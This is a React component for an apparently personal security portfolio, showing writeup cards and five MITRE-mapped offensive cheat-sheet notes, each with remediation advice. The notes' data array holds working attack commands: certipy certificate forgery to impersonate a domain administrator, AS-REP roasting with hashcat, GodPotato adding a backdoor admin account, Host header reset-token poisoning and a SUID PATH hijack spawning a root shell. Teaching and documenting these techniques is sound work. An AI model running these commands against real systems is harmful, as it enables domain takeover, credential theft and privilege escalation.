"use client";

import React, { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";
import {
  ArrowUpRight,
  BookOpen,
  ChevronRight,
  X,
} from "lucide-react";
import { soundManager } from "@/lib/audio";
import { writeups } from "@/lib/writeups";

// Technical Notes with MITRE ATT&CK mapping inspired by penguin-portfolio
export interface ResearchNote {
  id: string;
  num: string;
  title: string;
  category: string;
  mitre: string;
  os: "Windows" | "Linux" | "Multi-Platform";
  difficulty: "Easy" | "Medium" | "Hard";
  date: string;
  summary: string;
  keySteps: string[];
  remediation: string;
}

const RESEARCH_NOTES: ResearchNote[] = [
  {
    id: "note-01",
    num: "01",
    title: "ESC1 AD CS Certificate Template Exploitation",
    category: "Active Directory",
    mitre: "T1649 - Steal or Forge Authentication Certificates",
    os: "Windows",
    difficulty: "Hard",
    date: "Jul 2026",
    summary:
      "When a certificate template has ENROLLEE_SUPPLIES_SUBJECT enabled along with Client Authentication EKU, any low-privilege domain user can request a certificate on behalf of Domain Admin (e.g., Administrator), harvesting the PFX and obtaining a TGT ticket via PKINIT.",
    keySteps: [
      "Enumerate vulnerable templates with Certify.exe or certipy find -vulnerable",
      "Request certificate specifying alt name: certipy req -u user@corp.local -p pass -target ca.corp.local -template VulnerableESC1 -upn administrator@corp.local",
      "Authenticate with PKINIT to receive Administrator TGT: certipy auth -pfx administrator.pfx",
    ],
    remediation:
      "Disable 'Supply in the request' flag on certificate templates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) unless strictly required.",
  },
  {
    id: "note-02",
    num: "02",
    title: "Kerberos AS-REP Roasting & Pre-Auth Downgrade",
    category: "Identity & Kerberos",
    mitre: "T1558.004 - Kerberos AS-REP Roasting",
    os: "Windows",
    difficulty: "Medium",
    date: "Jul 2026",
    summary:
      "Accounts configured with DONT_REQ_PREAUTH allow any network attacker to query the KDC for an AS-REP ticket without providing credentials. The encrypted timestamp portion can be cracked offline with Hashcat mode 18200.",
    keySteps: [
      "Discover accounts without pre-auth: GetNPUsers.py telecom.local/ -no-pass -usersfile users.txt",
      "Format raw Kerberos AS-REP hash string",
      "Crack offline using wordlist: hashcat -m 18200 asrep_hashes.txt rockyou.txt",
    ],
    remediation:
      "Ensure 'Do not require Kerberos preauthentication' is unchecked on all Active Directory user accounts.",
  },
  {
    id: "note-03",
    num: "03",
    title: "GodPotato: SeImpersonatePrivilege on Windows Server",
    category: "Privilege Escalation",
    mitre: "T1134 - Access Token Manipulation",
    os: "Windows",
    difficulty: "Medium",
    date: "Jul 2026",
    summary:
      "Bypasses RPC restrictions on Windows Server 2019/2022 where traditional JuicyPotato fails. Abuses DCOM activation and hook RPC to capture SYSTEM token via fake pipe server.",
    keySteps: [
      "Verify SeImpersonatePrivilege via whoami /priv on service account (e.g., IIS_IUSRS or MSSQL)",
      "Deploy GodPotato binary: GodPotato.exe -cmd \"cmd.exe /c net user hacker Pass123! /add && net localgroup administrators hacker /add\"",
      "Verify elevated admin group membership",
    ],
    remediation:
      "Restrict service accounts from running interactive shells and assign least-privilege service configurations.",
  },
  {
    id: "note-04",
    num: "04",
    title: "Host Header Injection & Password Reset Poisoning",
    category: "Web Security",
    mitre: "T1552 - Unsecured Credentials",
    os: "Multi-Platform",
    difficulty: "Easy",
    date: "Aug 2026",
    summary:
      "Web applications that dynamically construct password reset URLs using the HTTP Host header allow an attacker to poison the link generated in emails, capturing the raw password reset token when clicked or logged.",
    keySteps: [
      "Intercept POST /forgot-password request via Burp Suite",
      "Replace Host header with attacker-controlled collaborator / request catcher URL",
      "Observe application echoing injected host into email verification token path",
      "Extract token from public catcher logs and submit new password",
    ],
    remediation:
      "Hardcode the canonical domain name in server configuration rather than trusting the incoming client Host header.",
  },
  {
    id: "note-05",
    num: "05",
    title: "SUID Binary PATH Hijacking & Dynamic Linker Abuse",
    category: "Linux Exploitation",
    mitre: "T1548.001 - Setuid and Setgid",
    os: "Linux",
    difficulty: "Easy",
    date: "Jun 2026",
    summary:
      "When a SUID binary invokes a system utility (such as cat or service) without specifying an absolute path (/bin/cat), an unprivileged user can prepend a malicious script directory to the PATH variable to hijack code execution under root privileges.",
    keySteps: [
      "Identify SUID binaries: find / -perm -4000 2>/dev/null",
      "Run strings or ltrace on target binary to identify unqualified commands: strings /usr/bin/bugtracker",
      "Create malicious payload: echo '/bin/bash -p' > /tmp/cat && chmod +x /tmp/cat",
      "Prepend to PATH: export PATH=/tmp:$PATH and execute the SUID tool",
    ],
    remediation:
      "Always specify absolute executable paths in custom compiled C/C++ or shell scripts with SUID permissions.",
  },
];

export default function PenguinEditorial() {
  const [selectedNote, setSelectedNote] = useState<ResearchNote | null>(null);
  const [activeFilter, setActiveFilter] = useState<string>("ALL");

  const filteredNotes = RESEARCH_NOTES.filter((note) => {
    if (activeFilter === "ALL") return true;
    if (activeFilter === "WINDOWS") return note.os === "Windows";
    if (activeFilter === "LINUX") return note.os === "Linux";
    return true;
  });

  return (
    <section className="py-24 px-4 bg-[#07070b] relative overflow-hidden" id="editorial">
      
      {/* Background Japanese Spider Lily Flourish (彼岸花 - Higanbana) */}
      <div className="absolute right-0 top-1/4 -translate-y-1/2 opacity-15 pointer-events-none select-none max-w-sm lg:max-w-md">
        <svg viewBox="0 0 100 100" className="w-full h-full fill-none stroke-[#ff1a2e]" strokeWidth="0.8">
          {/* Stylized spider lily petal curls */}
          <path d="M50,90 Q50,40 50,10" />
          <path d="M50,50 Q20,30 5,45 Q20,25 50,45" />
          <path d="M50,50 Q80,30 95,45 Q80,25 50,45" />
          <path d="M50,45 Q25,15 15,20 Q35,10 50,40" />
          <path d="M50,45 Q75,15 85,20 Q65,10 50,40" />
          <path d="M50,40 Q30,-5 25,0 Q40,-5 50,35" />
          <path d="M50,40 Q70,-5 75,0 Q60,-5 50,35" />
          <circle cx="5" cy="45" r="1.5" fill="#ff1a2e" />
          <circle cx="95" cy="45" r="1.5" fill="#ff1a2e" />
          <circle cx="15" cy="20" r="1.5" fill="#ff1a2e" />
          <circle cx="85" cy="20" r="1.5" fill="#ff1a2e" />
          <circle cx="25" cy="0" r="1.5" fill="#ff1a2e" />
          <circle cx="75" cy="0" r="1.5" fill="#ff1a2e" />
        </svg>
      </div>

      <div className="max-w-5xl mx-auto relative z-10">
        
        {/* MANIFESTO HEADER INSPIRED BY PENGUIN-PORTFOLIO */}
        <div className="mb-16">
          <div className="flex items-center gap-3 text-xs font-mono text-[#ff1a2e] mb-3 uppercase tracking-[0.25em]">
            <span>彼岸花 // RED SPIDER LILY</span>
            <span>•</span>
            <span>OFFENSIVE ARTIFACTS</span>
          </div>

          <h2 className="text-4xl sm:text-6xl md:text-7xl font-deathnote tracking-tight text-white mb-4 leading-none">
            Every root leaves a stain.
          </h2>

          <p className="font-mono text-xs sm:text-sm text-gray-400 max-w-2xl leading-relaxed">
            Offensive penetration audits, Active Directory attack chains, and proving ground writeups. Every system in this index was compromised, dissected, and remediated under rigorous standards.
          </p>
        </div>

        {/* SECTION A: SELECTED WRITEUPS GRID (PENGUIN STYLE) */}
        <div className="mb-20">
          <div className="flex items-center justify-between pb-4 mb-8 border-b border-white/5">
            <div className="flex items-center gap-2">
              <span className="font-deathnote text-2xl text-white tracking-wide">
                SELECTED WRITEUPS
              </span>
              <span className="text-xs font-mono text-[#ff1a2e] bg-[#ff1a2e]/10 px-2 py-0.5 rounded border border-[#ff1a2e]/20">
                {writeups.length} ARTICLES
              </span>
            </div>
            
            <Link
              href="/writeup"
              onClick={() => soundManager.playTick()}
              className="text-xs font-mono text-gray-400 hover:text-[#ff1a2e] flex items-center gap-1 transition-colors"
            >
              <span>View full archive</span>
              <ArrowUpRight size={13} />
            </Link>
          </div>

          {/* Cards Grid */}
          <div className="grid md:grid-cols-3 gap-6">
            {writeups.map((w, idx) => {
              const isWindows = w.tags.includes("Active Directory") || w.platform.includes("Cyberwarfare");
              const isLinux = w.tags.includes("Linux") || w.tags.includes("IDOR") || w.slug.includes("oopsie");

              const difficulty = idx === 1 ? "Hard" : idx === 0 ? "Medium" : "Easy";
              const osLabel = isWindows ? "Windows" : isLinux ? "Linux" : "Web / CTF";

              return (
                <motion.div
                  key={w.slug}
                  whileHover={{ y: -6 }}
                  onMouseEnter={() => soundManager.playTick()}
                  className="double-bezel group cursor-pointer flex flex-col h-full"
                >
                  <Link href={`/writeup/${w.slug}`} className="double-bezel-inner p-5 flex flex-col h-full justify-between">
                    <div>
                      {/* Thumbnail Preview */}
                      <div className="aspect-[16/10] w-full rounded-lg overflow-hidden mb-4 bg-black/60 border border-white/5 relative group-hover:border-[#ff1a2e]/40 transition-colors">
                        <img
                          src={w.thumbnail}
                          alt={w.title}
                          className="w-full h-full object-contain group-hover:scale-105 transition-transform duration-500"
                        />
                        <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent" />
                        
                        {/* OS & Difficulty Badges on Top */}
                        <div className="absolute top-2.5 left-2.5 flex items-center gap-1.5">
                          <span className="px-2 py-0.5 rounded-full text-[10px] font-mono bg-black/80 border border-white/10 text-white backdrop-blur-sm">
                            {osLabel}
                          </span>
                          <span
                            className={`px-2 py-0.5 rounded-full text-[10px] font-mono font-semibold backdrop-blur-sm ${
                              difficulty === "Hard"
                                ? "bg-[#ff1a2e]/80 text-white"
                                : difficulty === "Medium"
                                ? "bg-[#f59e0b]/80 text-black"
                                : "bg-[#10b981]/80 text-white"
                            }`}
                          >
                            {difficulty}
                          </span>
                        </div>
                      </div>

                      {/* Title */}
                      <h3 className="font-deathnote text-lg text-white mb-2 group-hover:text-[#ff1a2e] transition-colors tracking-wide line-clamp-2">
                        {w.title}
                      </h3>

                      {/* Description */}
                      <p className="text-gray-400 font-sans text-xs mb-4 line-clamp-3 leading-relaxed">
                        {w.desc}
                      </p>
                    </div>

                    <div>
                      {/* Tags */}
                      <div className="flex flex-wrap gap-1 mb-4 pt-3 border-t border-white/5">
                        {w.tags.slice(0, 3).map((tag) => (
                          <span key={tag} className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/5 text-gray-400">
                            {tag}
                          </span>
                        ))}
                      </div>

                      {/* Bottom Footer */}
                      <div className="flex items-center justify-between text-[11px] font-mono text-gray-500">
                        <span>{w.date}</span>
                        <div className="flex items-center gap-1 text-[#ff1a2e] group-hover:translate-x-1 transition-transform">
                          <span>Read Report</span>
                          <ChevronRight size={13} />
                        </div>
                      </div>
                    </div>
                  </Link>
                </motion.div>
              );
            })}
          </div>
        </div>

        {/* SECTION B: RECENT TECHNICAL RESEARCH NOTES (PENGUIN STYLE) */}
        <div>
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 mb-6 border-b border-white/5">
            <div>
              <div className="flex items-center gap-2">
                <BookOpen size={18} className="text-[#ff1a2e]" />
                <h3 className="font-deathnote text-2xl text-white tracking-wide">
                  RECENT TECHNICAL NOTES
                </h3>
              </div>
              <span className="text-xs font-mono text-gray-400 mt-1 block">
                Concise operational cheat-sheets, exploitation chains, and defensive remediations.
              </span>
            </div>

            {/* Filter pills */}
            <div className="flex items-center gap-1.5">
              {["ALL", "WINDOWS", "LINUX"].map((f) => (
                <button
                  key={f}
                  onClick={() => {
                    soundManager.playTick();
                    setActiveFilter(f);
                  }}
                  className={`px-3 py-1 rounded-full text-xs font-mono transition-colors ${
                    activeFilter === f
                      ? "bg-[#ff1a2e] text-white font-bold"
                      : "bg-white/5 text-gray-400 hover:text-white"
                  }`}
                >
                  {f}
                </button>
              ))}
            </div>
          </div>

          {/* Clean Editorial Notes List */}
          <div className="double-bezel overflow-hidden">
            <div className="double-bezel-inner divide-y divide-white/5">
              {filteredNotes.map((note) => (
                <div
                  key={note.id}
                  onClick={() => {
                    soundManager.playTick();
                    setSelectedNote(note);
                  }}
                  onMouseEnter={() => soundManager.playTick()}
                  className="p-5 sm:p-6 flex flex-col md:flex-row md:items-center justify-between gap-4 hover:bg-white/[0.025] transition-colors cursor-pointer group"
                >
                  <div className="flex items-start md:items-center gap-4">
                    <span className="font-deathnote text-xl text-[#ff1a2e] font-bold shrink-0 pt-0.5 md:pt-0 w-8">
                      {note.num}
                    </span>
                    <div>
                      <div className="flex items-center gap-2 flex-wrap">
                        <h4 className="font-deathnote text-base sm:text-lg text-white group-hover:text-[#ff1a2e] transition-colors tracking-wide">
                          {note.title}
                        </h4>
                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/5 border border-white/10 text-gray-300">
                          {note.os}
                        </span>
                        <span className="text-[10px] font-mono text-[#ff1a2e]">
                          [{note.mitre.split(" - ")[0]}]
                        </span>
                      </div>
                      <p className="font-mono text-xs text-gray-400 mt-1 max-w-2xl line-clamp-1">
                        {note.summary}
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center justify-between md:justify-end gap-4 text-xs font-mono text-gray-500 shrink-0">
                    <span>{note.date}</span>
                    <div className="w-8 h-8 rounded-full border border-white/10 group-hover:border-[#ff1a2e] group-hover:bg-[#ff1a2e] flex items-center justify-center text-gray-400 group-hover:text-white transition-all">
                      <ArrowUpRight size={13} />
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>

        </div>

      </div>

      {/* INTERACTIVE TECHNICAL NOTE MODAL */}
      <AnimatePresence>
        {selectedNote && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 10 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 10 }}
              className="double-bezel max-w-2xl w-full"
            >
              <div className="double-bezel-inner p-6 sm:p-8 bg-[#09090e] max-h-[85vh] overflow-y-auto">
                
                {/* Modal Header */}
                <div className="flex items-start justify-between pb-4 mb-4 border-b border-white/5">
                  <div>
                    <div className="flex items-center gap-2 text-xs font-mono text-[#ff1a2e] mb-1">
                      <span>RESEARCH NOTE // 0x{selectedNote.num}</span>
                      <span>•</span>
                      <span>{selectedNote.category}</span>
                    </div>
                    <h3 className="font-deathnote text-2xl text-white tracking-wide">
                      {selectedNote.title}
                    </h3>
                  </div>
                  
                  <button
                    onClick={() => {
                      soundManager.playTick();
                      setSelectedNote(null);
                    }}
                    className="p-1.5 rounded-lg bg-white/5 border border-white/10 hover:border-[#ff1a2e] text-gray-400 hover:text-white transition-colors"
                  >
                    <X size={16} />
                  </button>
                </div>

                {/* MITRE ATT&CK & Metadata */}
                <div className="flex flex-wrap gap-2 mb-6">
                  <span className="text-[11px] font-mono px-2.5 py-1 rounded bg-[#ff1a2e]/10 border border-[#ff1a2e]/30 text-[#ff1a2e] font-semibold">
                    MITRE: {selectedNote.mitre}
                  </span>
                  <span className="text-[11px] font-mono px-2.5 py-1 rounded bg-white/5 border border-white/10 text-gray-300">
                    Platform: {selectedNote.os}
                  </span>
                  <span className="text-[11px] font-mono px-2.5 py-1 rounded bg-white/5 border border-white/10 text-gray-300">
                    Difficulty: {selectedNote.difficulty}
                  </span>
                </div>

                {/* Technical Overview */}
                <div className="mb-6">
                  <h4 className="text-xs font-mono uppercase text-gray-400 tracking-wider mb-2">
                    EXPLOITATION SUMMARY
                  </h4>
                  <p className="font-sans text-sm text-gray-200 leading-relaxed bg-black/40 p-4 rounded-xl border border-white/5">
                    {selectedNote.summary}
                  </p>
                </div>

                {/* Execution Kill Chain */}
                <div className="mb-6">
                  <h4 className="text-xs font-mono uppercase text-gray-400 tracking-wider mb-2">
                    ATTACK EXECUTION STEPS
                  </h4>
                  <div className="space-y-2">
                    {selectedNote.keySteps.map((step, idx) => (
                      <div key={idx} className="p-3 rounded-lg bg-black/60 border border-white/5 font-mono text-xs text-gray-300 flex items-start gap-2.5">
                        <span className="text-[#ff1a2e] font-bold">{idx + 1}.</span>
                        <code className="text-gray-200 break-all">{step}</code>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Remediation & Hardening */}
                <div className="mb-6">
                  <h4 className="text-xs font-mono uppercase text-[#ff1a2e] tracking-wider mb-2">
                    DEFENSIVE MITIGATION // HARDENING
                  </h4>
                  <p className="font-sans text-xs text-gray-300 leading-relaxed bg-[#ff1a2e]/5 p-3.5 rounded-lg border border-[#ff1a2e]/20">
                    {selectedNote.remediation}
                  </p>
                </div>

                <div className="pt-4 border-t border-white/5 flex items-center justify-between text-xs font-mono text-gray-500">
                  <span>DEEP FORENSIC CODEX</span>
                  <button
                    onClick={() => {
                      soundManager.playTick();
                      setSelectedNote(null);
                    }}
                    className="text-[#ff1a2e] hover:underline"
                  >
                    [ CLOSE NOTE ]
                  </button>
                </div>

              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </section>
  );
}
